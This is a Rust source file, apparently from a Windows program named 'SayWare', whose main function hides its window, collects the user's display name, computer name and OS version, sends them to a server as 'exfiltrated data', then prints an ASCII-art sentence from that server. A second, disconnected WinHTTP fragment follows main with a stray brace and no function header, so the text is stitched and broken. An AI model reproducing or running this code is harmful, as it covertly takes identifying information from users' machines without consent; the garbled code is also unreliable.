// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

#![windows_subsystem = "windows"]

use crate::server::Client;
use cfonts::{Fonts, Options, render};
use sayware_types::ExfiltratedData;
use windows::{
    Wdk::System::SystemServices::RtlGetVersion,
    Win32::{
        NetworkManagement::NetManagement::UNLEN,
        Security::Authentication::Identity::{GetUserNameExW, NameDisplay},
        System::{
            Console::AllocConsole,
            SystemInformation::{ComputerNameNetBIOS, GetComputerNameExW, OSVERSIONINFOEXW},
            WindowsProgramming::MAX_COMPUTERNAME_LENGTH,
        },
    },
    core::PWSTR,
};

mod server;

#[tokio::main]
async fn main() {
    let Ok(client) = Client::new() else {
        return;
    };

    if let Some(data) = get_data_to_exfiltrate() {
        client.exfiltrate_data(data).await;
    }

    if unsafe { AllocConsole() }.is_err() {
        return;
    }

    println!(
        "{}",
        render(Options {
            text: client.get_sentence().await,
            font: Fonts::FontTiny,
            ..Options::default()
        })
        .text
    );

    let mut input = String::new();
    let _ = std::io::stdin().read_line(&mut input);
}

    }

    let available_bytes: u32 = 0;

    if unsafe { WinHttpQueryDataAvailable(request, &available_bytes as *const _ as *mut _) }
        .is_err()
    {
        let _ = unsafe { WinHttpCloseHandle(request) };
        let _ = unsafe { WinHttpCloseHandle(connection) };
        let _ = unsafe { WinHttpCloseHandle(session) };
    }

    let mut sentence_bytes = vec![0u8; available_bytes as usize];

    let status_code = unsafe {
        WinHttpReadDataEx(
            request,
            sentence_bytes.as_mut_ptr() as *mut _,
            available_bytes,
            ptr::null_mut(),
            0, // I don't find "READ_DATA_EX_FLAG_FILL_BUFFER"
            0,
            None,
        )
    };

    let _ = unsafe { WinHttpCloseHandle(request) };
    let _ = unsafe { WinHttpCloseHandle(connection) };
    let _ = unsafe { WinHttpCloseHandle(session) };

    if status_code != 0 {
        return;
    }

    let sentence = {
        let Ok(sentence) = String::from_utf8(sentence_bytes) else {
            return;
        };

        render(Options {
            text: sentence,
            font: Fonts::FontTiny,
            ..Options::default()
        })
        .text
        .encode_utf16()
        .collect::<Vec<_>>()
    };

    let standard_output = {
        let Ok(standard_output) = (unsafe { GetStdHandle(STD_OUTPUT_HANDLE) }) else {
            return;
        };

        unsafe { Owned::new(standard_output) }
    };

    let _ = unsafe { WriteConsoleW(*standard_output, sentence.as_slice(), None, None) };
}
